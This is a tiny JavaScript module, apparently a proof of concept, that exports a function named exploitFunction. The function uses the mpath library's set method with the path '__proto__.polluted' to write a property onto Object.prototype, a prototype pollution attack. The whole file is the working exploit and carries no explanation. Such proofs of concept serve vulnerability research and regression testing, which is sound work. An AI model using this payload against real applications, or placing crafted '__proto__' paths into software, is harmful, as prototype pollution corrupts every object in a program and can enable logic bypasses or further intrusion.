function exploitFunction(obj) {
    var mpath = require("mpath");

    mpath.set("__proto__.polluted", "yes", obj);
}

module.exports = { exploitFunction };